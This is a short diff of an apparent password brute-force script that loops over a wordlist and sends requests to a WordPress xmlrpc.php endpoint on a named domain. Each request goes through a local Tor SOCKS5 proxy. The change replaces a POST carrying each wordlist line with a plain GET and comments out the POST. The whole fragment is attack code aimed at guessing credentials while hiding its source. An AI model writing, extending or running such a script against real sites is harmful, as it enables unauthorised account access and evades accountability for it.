@@ -16,7 +16,8 @@ with open(wordlist, 'r') as f:
         proxiesdef = {'http': 'socks5://localhost:9050','https': 'socks5://localhost:9050'}
         passwds = line
         print(line)
-        r =requests.post('http://macaxeirateste.tk/xmlrpc.php', data=line, proxies=proxiesdef)
+        r =requests.get('http://macaxeirateste.tk/xmlrpc.php', proxies=proxiesdef)
+        #r =requests.post('http://macaxeirateste.tk/xmlrpc.php', data=line, proxies=proxiesdef)
         print(r.text)
 
      
